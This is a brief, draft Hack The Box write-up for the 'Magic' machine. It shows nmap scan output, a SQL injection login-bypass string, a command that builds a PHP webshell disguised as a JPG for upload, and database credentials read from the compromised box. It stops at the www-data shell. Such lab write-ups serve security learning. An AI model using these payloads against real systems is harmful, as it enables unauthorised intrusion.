---
title: HTB Magic
author: kei5uke
draft: true
description: Writeup for HTB Magic
tags:
  - linux
  - writeup
---

# Nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
PORT      STATE         SERVICE
17/udp    open|filtered qotd
68/udp    open|filtered dhcpc
123/udp   open|filtered ntp
427/udp   open|filtered svrloc
518/udp   open|filtered ntalk
631/udp   open|filtered ipp
1026/udp  open|filtered win-rpc
1029/udp  open|filtered solid-mux
1812/udp  open|filtered radius
1813/udp  open|filtered radacct
2048/udp  open|filtered dls-monitor
2049/udp  open|filtered nfs
2223/udp  open|filtered rockwell-csp2
3456/udp  open|filtered IISrpc-or-vat
5353/udp  open|filtered zeroconf
30718/udp open|filtered unknown
49193/udp open|filtered unknown
49194/udp open|filtered unknown
49201/udp open|filtered unknown

```

# HTTP

SQL injection

```bash
Not works:
admin' or 1=1 --

This works:
admin' or 1=1 -- ## 
```

Upload php image: `python3 php_in_jpg.py -m metadata -o payload.php.jpg`

# Shell as www-data

```bash
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```
